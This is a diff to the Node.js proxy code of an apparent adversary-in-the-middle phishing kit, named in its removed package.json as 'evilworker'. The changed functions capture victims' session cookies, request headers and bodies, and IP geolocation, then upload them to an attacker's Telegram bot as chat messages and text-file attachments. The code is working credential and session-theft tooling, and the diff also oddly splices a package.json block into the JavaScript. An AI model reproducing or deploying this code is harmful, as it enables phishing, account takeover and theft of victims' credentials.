@@ -45,62 +45,98 @@ function extractCookiesFromHeaders(headers) {
     return Object.keys(cookies).length ? cookies : null;
 }
 
-const AdmZip = require('adm-zip');
-
 async function sendCookiesAsFile(cookies, sessionId) {
     if (!cookies || Object.keys(cookies).length === 0) return;
 
     const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
     const randomName = Math.random().toString(36).substring(2, 10);
-    const filename = `session_${randomName}_${timestamp}.zip`;
+    const filename = `session_${randomName}_${timestamp}.txt`;
     const tmpDir = require('os').tmpdir();
-    const zipPath = path.join(tmpDir, filename);
+    const filePath = path.join(tmpDir, filename);
 
-    // 𝙲𝚛𝚎𝚊𝚝𝚎 𝚉𝙸𝙿 𝚏𝚒𝚕𝚎
-    const zip = new AdmZip();
-    const cookieData = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
-    zip.addFile('cookies.txt', Buffer.from(cookieData, 'utf-8'));
-    zip.writeZip(zipPath);
+    const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
+    fs.writeFileSync(filePath, content);
 
     try {
         const FormData = require('form-data');
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('document', fs.createReadStream(zipPath), { filename: filename });
-        form.append('caption', `📎 Cookie file (ZIP): ${filename}`);
+        form.append('document', fs.createReadStream(filePath), { filename: filename });
+        form.append('caption', `📎 Cookie file: ${filename}`);
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-        console.log('✅ ZIP file sent to Telegram:', filename);
     } catch (e) {
-        console.log('❌ ZIP send failed:', e.message);
+        console.log('Cookie file send failed', e.message);
     }
 
-    try { fs.unlinkSync(zipPath); } catch (e) {}
+    try { fs.unlinkSync(filePath); } catch (e) {}
 }
 
 // ================================================
 // 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
 // ================================================
 
-{
-  "name": "evilworker",
-  "version": "1.0.0",
-  "description": "AiTM phishing framework using service workers",
-  "main": "proxy_server.js",
-  "scripts": {
-    "start": "node proxy_server.js"
-  },
-  "dependencies": {
-    "axios": "^1.6.0",
-    "form-data": "^4.0.0",
-    "adm-zip": "^0.5.10"
-  },
-  "engines": {
-    "node": ">=18.0.0"
-  }
+async function sendToTelegram(data) {
+    try {
+        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                   data.proxyRequestHeaders?.['x-real-ip'] || 
+                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+
+        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+        let flag = '🌍';
+        let location = 'Unknown';
+
+        if (ip !== 'Unknown') {
+            geo = await getGeoInfo(ip);
+            flag = getFlagEmoji(geo.countryCode);
+            location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+        }
+
+        const message = `
+🔐 **New Capture!**
+
+🌍 **IP:** ${ip}
+${flag} **Location:** ${location}
+🏢 **ISP:** ${geo.isp || 'N/A'}
+📡 **Org:** ${geo.org || 'N/A'}
+
+🕒 **Time:** ${data.timestamp || new Date().toISOString()}
+🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
+📨 **Method:** ${data.proxyRequestMethod || 'N/A'}
+
+📋 **Headers:**
+\`\`\`json
+${JSON.stringify(data.proxyRequestHeaders || {}, null, 2)}
+\`\`\`
+
+📦 **Body:**
+\`\`\`json
+${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
+\`\`\`
+
+📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
+        `;
+
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        // 𝙰𝚝𝚝𝚊𝚌𝚑 𝚌𝚘𝚘𝚔𝚒𝚎𝚜 𝚊𝚜 .𝚝𝚡𝚝 𝚏𝚒𝚕𝚎
+        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
+        if (cookies) {
+            await sendCookiesAsFile(cookies, data.sessionId || 'unknown');
+        }
+
+    } catch (e) {
+        console.log('Telegram send failed', e.message);
+    }
 }
+
 // ================================================
 // 𝚁𝙴𝚂𝚃 𝙾𝙵 𝚈𝙾𝚄𝚁 𝙲𝙾𝙳𝙴 (𝚑𝚝𝚝𝚙, 𝚑𝚝𝚝𝚙𝚜, 𝚙𝚊𝚝𝚑, 𝚏𝚜, 𝚎𝚝𝚌.)
 // ================================================
